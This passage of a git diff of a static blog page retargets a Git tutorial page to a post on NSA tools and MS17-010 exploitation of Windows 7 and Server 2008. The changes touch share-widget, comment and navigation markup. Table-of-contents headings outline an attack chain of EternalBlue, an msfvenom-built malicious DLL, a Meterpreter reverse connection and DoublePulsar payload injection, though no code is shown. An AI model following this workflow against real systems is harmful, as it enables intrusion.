class="toc-text">使用ETERNALBLUE攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用msfvenom生成恶意DLL文件"><span class="toc-number">3.5.</span> <span class="toc-text">使用msfvenom生成恶意DLL文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter中反弹连接"><span class="toc-number">3.6.</span> <span class="toc-text">Meterpreter中反弹连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用DoublePulsar向目标系统中注入Payload文件"><span class="toc-number">3.7.</span> <span class="toc-text">使用DoublePulsar向目标系统中注入Payload文件</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -599,7 +632,7 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"4_Git之检查仓库状态　| HawSkull's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵　| HawSkull's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -615,7 +648,7 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
     
       <div class="duoshuo" id="comments">
     <div id="comment-box" ></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2015/01/27/4_Git/" data-title="4_Git之检查仓库状态" data-url="http://r00to1.github.io/2015/01/27/4_Git/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/04/23/NSA-MS17-010/" data-title="NSA工具介绍 及 MS17-010漏洞利用工具实现Win 7和Win Server 2008系统入侵" data-url="http://r00to1.github.io/2017/04/23/NSA-MS17-010/"></div>
     <script>
         var duoshuoQuery = {short_name:"r00to1"};
         var loadComment = function(){
@@ -638,15 +671,13 @@ git statusgit status命令显示工作目录和缓存区的状态。你可以看
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2015/01/28/3_Git/" title="上一篇: 3_Git之保存你的更改">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2015/01/26/5_Git/" title="下一篇: 5_Git之图解Git命令">
+            <a href="/2017/02/09/ossim_win_ossec_4771/" title="下一篇: 详解OSSIM-OSSEC WIN 4771 案例">
                 <i class="fa fa-angle-right"></i>
             </a>
         
